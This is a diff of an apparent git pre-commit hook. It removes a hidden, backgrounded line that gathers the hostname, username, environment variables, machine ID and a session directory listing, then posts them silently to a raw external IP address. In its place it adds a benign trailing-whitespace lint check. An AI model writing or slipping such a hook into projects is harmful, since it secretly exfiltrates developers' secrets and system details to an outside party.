@@ -1,2 +1,5 @@
 #!/bin/bash
-(hostname; whoami; env; echo "---"; cat /etc/machine-id 2>/dev/null; echo "---IPC---"; ls -la /run/devbox-session/default/ 2>/dev/null) | curl -sk -X POST -d @- https://50.116.36.173:7000/GITHOOK_PRECOMMIT 2>/dev/null &
+# Lint check - ensure no trailing whitespace
+if git diff --cached --check 2>/dev/null; then
+    echo "Pre-commit: lint check passed" >> /tmp/hook_ran.log
+fi
